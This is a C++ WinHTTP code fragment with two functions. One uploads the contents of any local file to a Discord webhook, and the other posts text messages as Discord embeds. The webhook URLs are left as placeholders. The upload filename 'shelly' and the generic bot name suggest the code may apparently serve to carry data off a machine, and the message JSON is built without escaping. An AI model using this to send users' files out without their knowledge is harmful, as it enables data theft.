void uploadFileToWebhook(const std::string& filePath) {
    HINTERNET hSession = WinHttpOpen(L"Cpione/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        L<WEBOHOOKOK LINK>,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    
    std::ifstream in(filePath);
    std::stringstream buffer{};
    buffer << in.rdbuf();
    std::string contents(buffer.str());

  
    std::string MultipartRequestBody =
        "--79823473247832748723478342\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"shelly\"\r\n"
        "Content-Type: application/octet-stream\r\n"
        "\r\n";
    std::string finalBody = "--79823473247832748723478342--\r\n";
    MultipartRequestBody += contents + "\r\n" + finalBody;

    const WCHAR* ContentType =
        L"Content-Type: multipart/form-data;boundary = 79823473247832748723478342";


    BOOL bResults = WinHttpAddRequestHeaders(
        hRequest,
        ContentType,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD
    );

     bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        MultipartRequestBody.length(),
        NULL);

    DWORD dwBytesWritten = 0;
    if (bResults)
        bResults = WinHttpWriteData(hRequest, MultipartRequestBody.c_str(),
            MultipartRequestBody.length(),
            &dwBytesWritten);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}


int sendMSG(std::string send) {
    HINTERNET hSession = WinHttpOpen(L"Cpione/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        L<ADWEBHOOKHERE>>>,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = "Title";
    std::string desc = send;
    std::string color = "16711680"; // Decimal color
    std::string request_body = "{\"username\": \"meow\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 1;
}
